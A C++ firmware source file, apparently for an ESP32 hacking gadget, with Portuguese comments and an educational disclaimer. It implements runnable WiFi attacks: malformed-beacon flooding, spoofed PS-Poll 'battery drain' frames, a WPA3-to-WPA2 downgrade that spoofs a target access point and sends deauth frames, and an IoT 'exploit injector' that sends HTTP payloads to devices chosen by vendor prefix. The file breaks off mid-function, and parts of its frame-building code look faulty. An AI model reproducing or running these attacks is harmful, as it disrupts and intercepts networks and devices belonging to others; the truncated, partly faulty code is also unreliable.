/**
 * @file advanced_atks.cpp
 * @brief Implementação de ataques WiFi avançados para fins acadêmicos e pesquisa.
 *
 * AVISO: Este código é fornecido exclusivamente para fins educacionais e de pesquisa.
 * O uso indevido pode ser ilegal. Use apenas em ambientes controlados e com autorização.
 */

#include "advanced_atks.h"
#include "core/config.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "sniffer.h"
#include "wifi_atks.h"
#include "evil_portal.h"
#include <Arduino.h>
#include <globals.h>
#include <vector>
#include <map>
#include <algorithm>
#include "core/net_utils.h"

extern void generateRandomMac(uint8_t* mac);

//================================================================================
// CONSTANTES E VARIÁVEIS GLOBAIS
//================================================================================

// Canais WiFi
static const uint8_t wifi_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
static uint8_t current_channel = 1;

// Controle de estado
static bool attack_running = false;
static TaskHandle_t attack_task_handle = NULL;

// Banco de dados OUI para IoT
static const OUIEntry iot_oui_database[] = {
    {{0x00, 0x17, 0x88}, "Philips", "Hue Lights", true},
    {{0x00, 0x24, 0xE4}, "Xiaomi", "Smart Home", true},
    {{0x04, 0xCF, 0x8C}, "Espressif", "ESP32/ESP8266", true},
    {{0x18, 0xB4, 0x30}, "Sonoff", "Smart Switch", true},
    {{0x24, 0x0A, 0xC4}, "Espressif", "ESP32", true},
    {{0x30, 0xAE, 0xA4}, "Espressif", "ESP32", true},
    {{0x3C, 0x71, 0xBF}, "Espressif", "ESP32", true},
    {{0x40, 0x91, 0x33}, "Amazon", "Echo/Alexa", true},
    {{0x50, 0xC7, 0xBF}, "TP-Link", "Smart Plug", true},
    {{0x68, 0xA8, 0x6D}, "Amazon", "Echo Dot", true},
    {{0x74, 0xC2, 0x46}, "Google", "Chromecast", true},
    {{0x7C, 0xA7, 0xB0}, "D-Link", "IP Camera", true},
    {{0x84, 0x0D, 0x8E}, "Nest", "Thermostat", true},
    {{0x90, 0x97, 0xB5}, "Ring", "Doorbell", true},
    {{0x94, 0x65, 0x2D}, "Samsung", "SmartThings", true},
    {{0xA4, 0x77, 0x33}, "Wemo", "Smart Plug", true},
    {{0xB4, 0x79, 0xA7}, "Amazon", "Fire TV", true},
    {{0xC8, 0xF2, 0x30}, "TP-Link", "Kasa", true},
    {{0xD0, 0x73, 0xD5}, "Belkin", "Wemo", true},
    {{0xDC, 0x4F, 0x22}, "Ring", "Camera", true},
    {{0xF0, 0x03, 0x8C}, "Nest", "Camera", true},
    {{0xFC, 0xA6, 0x67}, "Yeelight", "Smart Bulb", true},
};
static const int iot_oui_count = sizeof(iot_oui_database) / sizeof(OUIEntry);

// Clientes detectados
static std::map<uint64_t, ClientInfo> detected_clients;

// Sessões capturadas
static std::vector<CapturedSession> captured_sessions;
static SessionCallback session_callback = nullptr;

// Heatmap data
static std::vector<HeatmapPoint> heatmap_points;

//================================================================================
// FUNÇÕES AUXILIARES
//================================================================================

// macToString is provided by core/net_utils.h
// generateRandomMac is provided by ble_spam.cpp (extern declared above)

bool stringToMac(const String& str, uint8_t* mac) {
    return sscanf(str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

bool isMulticastMac(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

bool initAdvancedAttackMode() {
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Falha ao iniciar WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != "WillyAttack") {
        if (!WiFi.softAP("WillyAttack", emptyString, 1, 1, 4, false)) {
            displayError("Falha ao iniciar AP", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    return true;
}

void deinitAdvancedAttackMode() {
    if (WiFi.softAPSSID() == "WillyAttack") {
        WiFi.softAPdisconnect();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) {
        wifiDisconnect();
    }
}

void advancedAtksMenu() {
    options.clear();
    options.push_back({"Beacon Fuzzer", [&]() {
        dynamicBeaconFuzzer();
    }});
    options.push_back({"Battery Drain", [&]() {
        clientBatteryDrain();
    }});
    options.push_back({"Visual Heatmap", [&]() {
        visualWifiHeatmap();
    }});
    options.push_back({"WPA3 Downgrade", [&]() {
        wpa3DowngradeAttack();
    }});
    options.push_back({"IoT Exploit Injector", [&]() {
        iotExploitInjector();
    }});
    options.push_back({"Mesh Disruptor", [&]() {
        meshDisruptor();
    }});
    options.push_back({"Smart Deauth", [&]() {
        smartDeauthScheduler();
    }});
    options.push_back({"Traffic Fingerprint", [&]() {
        encryptedTrafficFingerprint();
    }});
    options.push_back({"Session Hijack", [&]() {
        sessionHijackPortal();
    }});
    options.push_back({"Mgmt Frame Bypass", [&]() {
        mgmtFrameBypassFlood();
    }});
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Ataques Avancados");
}

//================================================================================
// 1. DYNAMIC BEACON FUZZER - IMPLEMENTAÇÃO COMPLETA
//================================================================================

// Templates de frames malformados
static const uint8_t malformed_beacon_templates[][16] = {
    // IE truncado
    {0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // IE com tamanho inválido
    {0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Duplicate IE
    {0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Invalid channel
    {0x03, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Zero length SSID IE
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

void dynamicBeaconFuzzer() {
    BeaconFuzzerConfig config;

    // Menu de configuração
    options = {
        {"Config Padrao", [&]() {
            config.packets_per_second = 500;
            config.randomize_ssid = true;
            config.randomize_mac = true;
            config.malformed_ie = true;
        }},
        {"Alta Velocidade (1000/s)", [&]() {
            config.packets_per_second = 1000;
            config.randomize_ssid = true;
            config.randomize_mac = true;
            config.malformed_ie = true;
        }},
        {"Modo Canais Especificos", [&]() {
            config.packets_per_second = 300;
            config.randomize_ssid = true;
            config.randomize_mac = true;
            config.malformed_ie = true;
        }},
    };
    addOptionToMainMenu();
    loopOptions(options);

    if (returnToMenu) return;

    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Beacon Fuzzer");
    tft.setTextColor(bruceConfig.priColor);
    padprintln("");
    padprintln("Enviando beacons malformados...");
    padprintln("Pressione ESC para parar");

    uint8_t beacon_buffer[128];
    uint8_t mac_addr[6];
    uint32_t frame_count = 0;
    uint32_t last_update = millis();
    uint16_t interval_ms = 1000 / config.packets_per_second;

    attack_running = true;

    while (attack_running) {
        // Gera MAC aleatório
        generateRandomMac(mac_addr);

        // Monta frame beacon
        memset(beacon_buffer, 0, sizeof(beacon_buffer));

        // Frame Control (Beacon)
        beacon_buffer[0] = 0x80;
        beacon_buffer[1] = 0x00;

        // Duration
        beacon_buffer[2] = 0x00;
        beacon_buffer[3] = 0x00;

        // Destination (broadcast)
        memset(&beacon_buffer[4], 0xFF, 6);

        // Source (random)
        memcpy(&beacon_buffer[10], mac_addr, 6);

        // BSSID (same as source)
        memcpy(&beacon_buffer[16], mac_addr, 6);

        // Sequence number
        beacon_buffer[22] = random(0, 255);
        beacon_buffer[23] = random(0, 16);

        // Timestamp
        uint64_t ts = esp_timer_get_time();
        memcpy(&beacon_buffer[24], &ts, 8);

        // Beacon interval (100 TU)
        beacon_buffer[32] = 0x64;
        beacon_buffer[33] = 0x00;

        // Capability info
        beacon_buffer[34] = 0x31;
        beacon_buffer[35] = 0x00;

        // SSID IE (random length para fuzzing)
        beacon_buffer[36] = 0x00; // SSID IE ID
        uint8_t ssid_len = random(0, 34); // Tamanho aleatório incluindo inválidos
        beacon_buffer[37] = ssid_len;

        // SSID aleatório
        for (int i = 0; i < ssid_len && (38 + i) < 128; i++) {
            beacon_buffer[38 + i] = random(32, 126);
        }

        // IE malformados se habilitado
        if (config.malformed_ie) {
            int ie_offset = 38 + ssid_len;

            // Adiciona IE malformado aleatório
            int template_idx = random(0, 5);
            for (int i = 0; i < 16 && (ie_offset + i) < 128; i++) {
                beacon_buffer[ie_offset + i] = malformed_beacon_templates[template_idx][i];
            }

            // Adiciona IEs extras aleatórios
            int extra_ies = random(1, 5);
            ie_offset += 16;
            for (int ie = 0; ie < extra_ies && (ie_offset + 4) < 128; ie++) {
                beacon_buffer[ie_offset] = random(0, 255); // IE ID aleatório
                beacon_buffer[ie_offset + 1] = random(0, 255); // Length aleatório
                ie_offset += 2 + beacon_buffer[ie_offset + 1];
            }
        }

        // Suported rates
        int rates_offset = 70;
        if (rates_offset + 10 < 128) {
            beacon_buffer[rates_offset] = 0x01; // Rates IE
            beacon_buffer[rates_offset + 1] = 0x08;
            beacon_buffer[rates_offset + 2] = 0x82;
            beacon_buffer[rates_offset + 3] = 0x84;
            beacon_buffer[rates_offset + 4] = 0x8b;
            beacon_buffer[rates_offset + 5] = 0x96;
            beacon_buffer[rates_offset + 6] = 0x24;
            beacon_buffer[rates_offset + 7] = 0x30;
            beacon_buffer[rates_offset + 8] = 0x48;
            beacon_buffer[rates_offset + 9] = 0x6c;
        }

        // Channel IE
        int chan_offset = rates_offset + 10;
        if (chan_offset + 3 < 128) {
            beacon_buffer[chan_offset] = 0x03; // DS Parameter
            beacon_buffer[chan_offset + 1] = 0x01;
            beacon_buffer[chan_offset + 2] = current_channel;
        }

        // Envia frame
        esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, chan_offset + 3, false);
        frame_count++;

        // Muda de canal periodicamente
        if (config.target_channel == 0 && frame_count % 100 == 0) {
            current_channel = wifi_channels[random(0, 11)];
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
        }

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Beacon Fuzzer");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Enviando beacons malformados...");
            padprintln("");
            padprintln("Frames: " + String(frame_count));
            padprintln("Taxa: " + String(frame_count / ((millis() - last_update) / 1000 + 1)) + "/s");
            padprintln("Canal: " + String(current_channel));
            padprintln("");
            padprintln("ESC para parar");
            frame_count = 0;
            last_update = millis();
        }

        // Controle de taxa
        vTaskDelay(interval_ms / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 2. CLIENT BATTERY DRAIN (PS-POLL SPOOF) - IMPLEMENTAÇÃO COMPLETA
//================================================================================

// PS-Poll frame template
static const uint8_t ps_poll_template[] = {
    0xA4, 0x00, // Frame Control (PS-Poll)
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // TA (client MAC, to be filled)
    0x00, 0x00, // Sequence
};

// Data frame null template (para manter cliente acordado)
static const uint8_t null_data_template[] = {
    0x48, 0x0B, // Frame Control (Data, ToDS, FromDS, MoreData)
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // DA
    0x00, 0x00, // Sequence
};

void clientBatteryDrain() {
    if (!initAdvancedAttackMode()) return;

    // Scan para encontrar APs e clientes
    drawMainBorderWithTitle("Battery Drain");
    padprintln("");
    padprintln("Escaneando redes...");

    int nets = WiFi.scanNetworks(false, true);
    std::vector<wifi_ap_record_t> ap_list;

    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memset(&record, 0, sizeof(record));
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = WiFi.channel(i);
        strncpy((char*)record.ssid, WiFi.SSID(i).c_str(), 31);
        ap_list.push_back(record);
    }

    if (ap_list.empty()) {
        displayError("Nenhuma rede encontrada", true);
        deinitAdvancedAttackMode();
        return;
    }

    // Menu para selecionar AP alvo
    int selected_idx = -1;
    options.clear();
    for (size_t i = 0; i < ap_list.size(); i++) {
        String name = String((char*)ap_list[i].ssid);
        if (name.length() == 0) name = "<Hidden>";
        int idx = i;
        options.push_back({name.substring(0, 20).c_str(), [&selected_idx, idx]() { selected_idx = idx; }});
    }
    addOptionToMainMenu();

    loopOptions(options, MENU_TYPE_SUBMENU, "Selecione AP Alvo");

    if (returnToMenu || selected_idx < 0) {
        deinitAdvancedAttackMode();
        return;
    }

    // Inicia sniffer para detectar clientes
    esp_wifi_set_promiscuous(true);

    uint8_t ps_poll_frame[sizeof(ps_poll_template)];
    uint8_t null_frame[sizeof(null_data_template)];
    memcpy(ps_poll_frame, ps_poll_template, sizeof(ps_poll_template));
    memcpy(null_frame, null_data_template, sizeof(null_data_template));

    uint32_t poll_count = 0;
    uint32_t last_update = millis();
    attack_running = true;

    // Seleciona canal do primeiro AP
    if (!ap_list.empty()) {
        current_channel = ap_list[0].primary;
        esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    }

    drawMainBorderWithTitle("Battery Drain");
    padprintln("");
    padprintln("Injetando PS-Poll frames...");
    padprintln("Clientes serao mantidos acordados");
    padprintln("");
    padprintln("Pressione ESC para parar");

    while (attack_running) {
        // Para cada AP detectado
        for (const auto& ap : ap_list) {
            // Muda para canal do AP
            esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);

            // Preenche frames com BSSID do AP
            memcpy(&ps_poll_frame[4], ap.bssid, 6);
            memcpy(&null_frame[4], ap.bssid, 6);
            memcpy(&null_frame[16], ap.bssid, 6);

            // Gera MAC de cliente aleatório
            uint8_t client_mac[6];
            generateRandomMac(client_mac);

            // Preenche endereço do cliente
            memcpy(&ps_poll_frame[10], client_mac, 6);
            memcpy(&null_frame[10], client_mac, 6);
            memcpy(&null_frame[16], client_mac, 6);

            // Envia PS-Poll
            esp_wifi_80211_tx(WIFI_IF_AP, ps_poll_frame, sizeof(ps_poll_template), false);

            // Envia NULL data com MoreData flag
            esp_wifi_80211_tx(WIFI_IF_AP, null_frame, sizeof(null_data_template), false);

            poll_count += 2;

            vTaskDelay(5 / portTICK_PERIOD_MS);
        }

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Battery Drain");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Injetando PS-Poll frames...");
            padprintln("");
            padprintln("APs alvo: " + String(ap_list.size()));
            padprintln("Frames enviados: " + String(poll_count));
            padprintln("Canal atual: " + String(current_channel));
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    esp_wifi_set_promiscuous(false);
    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 3. VISUAL WIFI HEATMAP NO TFT - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void visualWifiHeatmap() {
    drawMainBorderWithTitle("WiFi Heatmap");
    padprintln("");
    padprintln("Escaneando redes...");

    // Scan networks
    int nets = WiFi.scanNetworks(false, true);

    if (nets == 0) {
        displayError("Nenhuma rede encontrada", true);
        return;
    }

    // Limpa pontos anteriores
    heatmap_points.clear();

    // Inicializa display
    int display_width = tft.width();
    int display_height = tft.height();
    int margin_top = 30;
    int margin_bottom = 30;
    int map_height = display_height - margin_top - margin_bottom;
    int map_width = display_width - 20;

    attack_running = true;
    uint32_t last_update = millis();
    int scan_count = 0;

    while (attack_running) {
        // Scan atual
        WiFi.scanNetworks(true, true); // Async scan

        // Aguarda scan
        int timeout = 3000;
        while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && timeout > 0) {
            vTaskDelay(100 / portTICK_PERIOD_MS);
            timeout -= 100;
            if (check(EscPress)) {
                attack_running = false;
                break;
            }
        }

        nets = WiFi.scanComplete();
        if (nets <= 0) {
            vTaskDelay(500 / portTICK_PERIOD_MS);
            continue;
        }

        // Limpa área do mapa
        tft.fillRect(10, margin_top, map_width, map_height, bruceConfig.bgColor);

        // Desenha grid
        tft.setTextColor(TFT_DARKGREY);
        for (int x = 10; x < display_width - 10; x += map_width / 4) {
            tft.drawLine(x, margin_top, x, display_height - margin_bottom, TFT_DARKGREY);
        }
        for (int y = margin_top; y < display_height - margin_bottom; y += map_height / 4) {
            tft.drawLine(10, y, display_width - 10, y, TFT_DARKGREY);
        }

        // Processa cada rede
        for (int i = 0; i < nets && i < 20; i++) {
            String ssid = WiFi.SSID(i);
            int rssi = WiFi.RSSI(i);
            int channel = WiFi.channel(i);
            uint8_t bssid[6];
            memcpy(bssid, WiFi.BSSID(i), 6);

            // Calcula posição baseado no canal
            int x = 10 + (channel % 4) * (map_width / 4) + random(-10, 10);
            int y = margin_top + map_height / 2 + random(-map_height / 4, map_height / 4);

            // Limita às bordas
            x = constrain(x, 10, display_width - 20);
            y = constrain(y, margin_top, display_height - margin_bottom - 10);

            // Calcula cor baseado no RSSI
            uint16_t color;
            if (rssi >= -50) {
                color = TFT_GREEN;
            } else if (rssi >= -60) {
                color = TFT_YELLOW;
            } else if (rssi >= -70) {
                color = TFT_ORANGE;
            } else {
                color = TFT_RED;
            }

            // Calcula tamanho do círculo
            int radius = map(-rssi, 30, 90, 15, 3);
            radius = constrain(radius, 3, 15);

            // Desenha AP
            tft.fillCircle(x, y, radius, color);

            // Desenha SSID (truncado)
            if (ssid.length() > 0) {
                tft.setTextColor(color);
                tft.setTextSize(1);
                tft.setCursor(x + radius + 2, y - 4);
                tft.print(ssid.substring(0, 8));
            }
        }

        // Desenha legenda
        tft.setTextColor(bruceConfig.priColor);
        tft.setTextSize(FM);
        tft.setCursor(10, display_height - margin_bottom + 5);
        tft.print("Redes: " + String(nets));
        tft.print(" | Scan: " + String(++scan_count));

        // Legenda de cores
        int legend_y = display_height - 12;
        tft.setTextSize(1);
        tft.fillCircle(10, legend_y, 3, TFT_GREEN);
        tft.setTextColor(TFT_GREEN);
        tft.setCursor(16, legend_y - 3);
        tft.print("> -50");

        tft.fillCircle(55, legend_y, 3, TFT_YELLOW);
        tft.setTextColor(TFT_YELLOW);
        tft.setCursor(61, legend_y - 3);
        tft.print("-60");

        tft.fillCircle(90, legend_y, 3, TFT_ORANGE);
        tft.setTextColor(TFT_ORANGE);
        tft.setCursor(96, legend_y - 3);
        tft.print("-70");

        tft.fillCircle(125, legend_y, 3, TFT_RED);
        tft.setTextColor(TFT_RED);
        tft.setCursor(131, legend_y - 3);
        tft.print("< -70");

        last_update = millis();

        // Aguarda antes do próximo scan
        for (int i = 0; i < 50; i++) {
            vTaskDelay(100 / portTICK_PERIOD_MS);
            if (check(EscPress)) {
                attack_running = false;
                break;
            }
        }
    }

    WiFi.scanDelete();
    returnToMenu = true;
}

//================================================================================
// 4. WPA3 DOWNGRADE + MITM COORDINATOR - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void wpa3DowngradeAttack() {
    // Scan para encontrar redes WPA3
    drawMainBorderWithTitle("WPA3 Downgrade");
    padprintln("");
    padprintln("Escaneando redes WPA3...");

    int nets = WiFi.scanNetworks(false, true);
    std::vector<int> wpa3_networks;

    for (int i = 0; i < nets; i++) {
        wifi_auth_mode_t auth = (wifi_auth_mode_t)WiFi.encryptionType(i);
        // Check for WPA3
        if (auth == WIFI_AUTH_WPA3_PSK || auth == WIFI_AUTH_WPA2_WPA3_PSK) {
            wpa3_networks.push_back(i);
        }
    }

    if (wpa3_networks.empty()) {
        displayError("Nenhuma rede WPA3 encontrada", true);
        return;
    }

    // Menu para selecionar rede
    int sel_idx = -1;
    options.clear();
    for (int idx : wpa3_networks) {
        String name = WiFi.SSID(idx);
        if (name.length() == 0) name = "<Hidden>";
        options.push_back({name.substring(0, 20).c_str(), [&sel_idx, idx]() { sel_idx = idx; }});
    }
    addOptionToMainMenu();

    loopOptions(options, MENU_TYPE_SUBMENU, "Selecione Rede WPA3");

    if (returnToMenu || sel_idx < 0) return;

    // Pega informações do AP selecionado
    int selected = sel_idx;
    String target_ssid = WiFi.SSID(selected);
    uint8_t target_bssid[6];
    memcpy(target_bssid, WiFi.BSSID(selected), 6);
    uint8_t target_channel = WiFi.channel(selected);

    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("WPA3 Downgrade");
    padprintln("");
    padprintln("Alvo: " + target_ssid);
    padprintln("Canal: " + String(target_channel));
    padprintln("");
    padprintln("Iniciando ataque de downgrade...");

    // Prepara frame beacon WPA2 (sem SAE/PMF)
    uint8_t wpa2_beacon[128];
    memset(wpa2_beacon, 0, sizeof(wpa2_beacon));

    // Frame Control
    wpa2_beacon[0] = 0x80;
    wpa2_beacon[1] = 0x00;

    // Duration
    wpa2_beacon[2] = 0x00;
    wpa2_beacon[3] = 0x00;

    // Destination (broadcast)
    memset(&wpa2_beacon[4], 0xFF, 6);

    // Source (BSSID do AP alvo)
    memcpy(&wpa2_beacon[10], target_bssid, 6);

    // BSSID
    memcpy(&wpa2_beacon[16], target_bssid, 6);

    // Timestamp
    uint64_t ts = esp_timer_get_time();
    memcpy(&wpa2_beacon[24], &ts, 8);

    // Beacon interval
    wpa2_beacon[32] = 0x64;
    wpa2_beacon[33] = 0x00;

    // Capability (WPA2, sem PMF)
    wpa2_beacon[34] = 0x11;
    wpa2_beacon[35] = 0x04;

    // SSID IE
    wpa2_beacon[36] = 0x00;
    wpa2_beacon[37] = target_ssid.length();
    memcpy(&wpa2_beacon[38], target_ssid.c_str(), target_ssid.length());

    // Suported rates
    int offset = 38 + target_ssid.length();
    wpa2_beacon[offset] = 0x01;
    wpa2_beacon[offset + 1] = 0x08;
    wpa2_beacon[offset + 2] = 0x82;
    wpa2_beacon[offset + 3] = 0x84;
    wpa2_beacon[offset + 4] = 0x8b;
    wpa2_beacon[offset + 5] = 0x96;
    wpa2_beacon[offset + 6] = 0x24;
    wpa2_beacon[offset + 7] = 0x30;
    wpa2_beacon[offset + 8] = 0x48;
    wpa2_beacon[offset + 9] = 0x6c;

    // Channel IE
    offset += 10;
    wpa2_beacon[offset] = 0x03;
    wpa2_beacon[offset + 1] = 0x01;
    wpa2_beacon[offset + 2] = target_channel;

    // RSN IE (WPA2 sem PMF obrigatório)
    offset += 3;
    wpa2_beacon[offset] = 0x30; // RSN IE
    wpa2_beacon[offset + 1] = 0x14; // Length
    wpa2_beacon[offset + 2] = 0x01;
    wpa2_beacon[offset + 3] = 0x00;
    wpa2_beacon[offset + 4] = 0x00;
    wpa2_beacon[offset + 5] = 0x0F;
    wpa2_beacon[offset + 6] = 0xAC;
    wpa2_beacon[offset + 7] = 0x02; // WPA2
    wpa2_beacon[offset + 8] = 0x02;
    wpa2_beacon[offset + 9] = 0x00;
    wpa2_beacon[offset + 10] = 0x00;
    wpa2_beacon[offset + 11] = 0x0F;
    wpa2_beacon[offset + 12] = 0xAC;
    wpa2_beacon[offset + 13] = 0x04;
    wpa2_beacon[offset + 14] = 0x00;
    wpa2_beacon[offset + 15] = 0x0F;
    wpa2_beacon[offset + 16] = 0xAC;
    wpa2_beacon[offset + 17] = 0x04;
    wpa2_beacon[offset + 18] = 0x01;
    wpa2_beacon[offset + 19] = 0x00;
    wpa2_beacon[offset + 20] = 0x00;
    wpa2_beacon[offset + 21] = 0x0F;
    wpa2_beacon[offset + 22] = 0xAC;
    wpa2_beacon[offset + 23] = 0x02;

    int beacon_len = offset + 24;

    // Prepara deauth frame
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[4], (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6);
    memcpy(&deauth_frame[10], target_bssid, 6);
    memcpy(&deauth_frame[16], target_bssid, 6);

    // Configura canal
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    attack_running = true;
    uint32_t beacon_count = 0;
    uint32_t deauth_count = 0;
    uint32_t last_update = millis();
    uint32_t last_deauth = 0;

    while (attack_running) {
        // Envia beacon WPA2 spoofado
        esp_wifi_80211_tx(WIFI_IF_AP, wpa2_beacon, beacon_len, false);
        beacon_count++;

        // Envia deauth periodicamente
        if (millis() - last_deauth > 5000) {
            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            deauth_count += 3;
            last_deauth = millis();
        }

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("WPA3 Downgrade");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Alvo: " + target_ssid);
            padprintln("Canal: " + String(target_channel));
            padprintln("BSSID: " + macToString(target_bssid));
            padprintln("");
            padprintln("Beacons WPA2: " + String(beacon_count));
            padprintln("Deauth frames: " + String(deauth_count));
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Clientes podem conectar com WPA2");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 5. IoT TARGETED EXPLOIT INJECTOR - IMPLEMENTAÇÃO COMPLETA
//================================================================================

bool detectIoTDevice(const uint8_t* mac, OUIEntry& entry) {
    for (int i = 0; i < iot_oui_count; i++) {
        if (memcmp(mac, iot_oui_database[i].prefix, 3) == 0) {
            entry = iot_oui_database[i];
            return true;
        }
    }
    return false;
}

void iotExploitInjector() {
    drawMainBorderWithTitle("IoT Exploit Injector");
    padprintln("");
    padprintln("Escaneando dispositivos IoT...");

    // Scan networks
    int nets = WiFi.scanNetworks(false, true);
    std::vector<std::pair<int, OUIEntry>> iot_devices;

    for (int i = 0; i < nets; i++) {
        uint8_t bssid[6];
        memcpy(bssid, WiFi.BSSID(i), 6);

        OUIEntry entry;
        if (detectIoTDevice(bssid, entry)) {
            iot_devices.push_back({i, entry});
        }
    }

    if (iot_devices.empty()) {
        displayError("Nenhum dispositivo IoT encontrado", true);
        return;
    }

    // Menu para selecionar dispositivo
    int sel_idx = -1;
    options.clear();
    for (size_t i = 0; i < iot_devices.size(); i++) {
        String ssid = WiFi.SSID(iot_devices[i].first);
        String name = ssid.substring(0, 12) + " [" + String(iot_devices[i].second.vendor) + "]";
        int idx = i;
        options.push_back({name.c_str(), [&sel_idx, idx]() { sel_idx = idx; }});
    }
    addOptionToMainMenu();

    loopOptions(options, MENU_TYPE_SUBMENU, "Dispositivos IoT");

    if (returnToMenu || sel_idx < 0) return;

    // Seleciona dispositivo escolhido
    int selected = iot_devices[sel_idx].first;
    OUIEntry entry = iot_devices[sel_idx].second;
    String target_ssid = WiFi.SSID(selected);
    uint8_t target_bssid[6];
    memcpy(target_bssid, WiFi.BSSID(selected), 6);

    // Menu de exploits
    int sel_exploit = -1;
    options.clear();
    options.push_back({"Scan de Portas", [&sel_exploit]() { sel_exploit = 0; }});
    options.push_back({"HTTP Exploit", [&sel_exploit]() { sel_exploit = 1; }});
    options.push_back({"TCP Payload", [&sel_exploit]() { sel_exploit = 2; }});
    options.push_back({"UDP Flood", [&sel_exploit]() { sel_exploit = 3; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Tipo de Exploit");

    if (returnToMenu || sel_exploit < 0) return;

    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("IoT Exploit");
    padprintln("");
    padprintln("Alvo: " + target_ssid);
    padprintln("Vendor: " + String(entry.vendor));
    padprintln("Tipo: " + String(entry.device_type));
    padprintln("");
    padprintln("Injetando payloads...");
    padprintln("ESC para parar");

    // Conecta ao AP alvo
    WiFi.begin(target_ssid.c_str(), "");

    int connect_timeout = 0;
    while (WiFi.status() != WL_CONNECTED && connect_timeout < 50) {
        vTaskDelay(200 / portTICK_PERIOD_MS);
        connect_timeout++;
        if (check(EscPress)) {
            deinitAdvancedAttackMode();
            returnToMenu = true;
            return;
        }
    }

    if (WiFi.status() != WL_CONNECTED) {
        // Tenta conexão aberta ou inicia ataque sem conexão
        drawMainBorderWithTitle("IoT Exploit");
        padprintln("");
        padprintln("Conexao falhou, injetando offline...");
    }

    attack_running = true;
    uint32_t payload_count = 0;
    uint32_t last_update = millis();

    // Payloads comuns para IoT
    const char* common_payloads[] = {
        "GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        "GET /admin HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        "GET /api/v1/system HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        "GET /setup.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        "POST /update HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 0\r\n\r\n",
    };

    while (attack_running) {
        // Envia payload via injection
        uint8_t packet[256];
        memset(packet, 0, sizeof(packet));

        // Frame control (Data)
        packet[0] = 0x08;
        packet[1] = 0x00;

        // Duration
        packet[2] = 0x00;
        packet[3] = 0x00;

        // Destination (BSSID)
